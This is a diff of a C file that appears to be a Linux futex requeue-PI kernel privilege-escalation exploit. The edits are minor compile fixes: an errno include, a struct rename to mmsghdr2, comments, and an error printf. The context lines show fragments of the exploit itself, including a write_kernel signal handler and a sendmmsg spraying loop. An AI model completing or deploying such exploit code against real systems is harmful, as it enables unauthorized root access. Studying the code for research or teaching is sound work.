@@ -9,6 +9,8 @@
 #include <sys/resource.h>
 #include <string.h>
 #include <fcntl.h>
+//179change added to check syscall error
+#include <errno.h>
 
 #define FUTEX_WAIT_REQUEUE_PI   11
 #define FUTEX_CMP_REQUEUE_PI    12
@@ -86,7 +88,7 @@ struct task_struct_partial {
 	char comm[16];
 };
 
-
+//179change changed mmsghdr to mmsghdr2
 struct mmsghdr2 {
 	struct msghdr msg_hdr;
 	unsigned int  msg_len;
@@ -357,7 +359,8 @@ void *make_action(void *arg) {
 	pthread_cond_signal(&is_thread_desched);
 
 	act.sa_handler = write_kernel;
-	//error type
+	//179change
+    //error type
     //act.sa_mask = 0;
     sigemptyset(&act.sa_mask);
     sigaddset(&act.sa_mask, 0);
@@ -481,6 +484,7 @@ int make_socket() {
 
 void *send_magicmsg(void *arg) {
 	int sockfd;
+    //179change changed mmsghdr to mmsghdr2
 	struct mmsghdr2 msgvec[1];
 	struct iovec msg_iov[8];
 	unsigned long databuf[0x20];
@@ -525,6 +529,9 @@ void *send_magicmsg(void *arg) {
 	while (1) {
 		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
 		if (ret <= 0) {
+            //179change
+            //prints error
+            printf("sendmmsg");
 			break;
 		}
 	}
